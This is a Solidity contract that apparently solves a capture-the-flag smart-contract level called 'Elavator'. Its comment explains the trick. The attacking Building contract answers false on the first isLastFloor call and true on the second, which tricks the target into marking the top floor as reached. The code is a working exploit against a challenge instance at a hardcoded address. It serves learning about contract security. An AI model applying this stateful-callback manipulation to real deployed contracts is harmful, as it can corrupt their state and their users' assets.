// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Building, which houses Elavator
 * @author Richu A Kuttikattu
 * @notice The Elavator is solved with a flag(top):
 *  Since both the calls to Building from Elavator are for the same floor number,
 *  checking for certain floors doesn't help. Instead you just check for the flag to return `true` or `false` back to the elevator,
 *  setting `top` to `true` in the Elavator contract in the final call
 */

contract Elavator {
    function goTo(uint256 _floor) public {}
}

contract Building {
    bool top = false;

    Elavator elavator = Elavator(0x84a4Ae7d009B4E03da249C4A186797316435953C);

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        }

        if (top) {
            return true;
        }
    }

    function getToTop(uint256 _floor) public {
        elavator.goTo(_floor);
    }
}
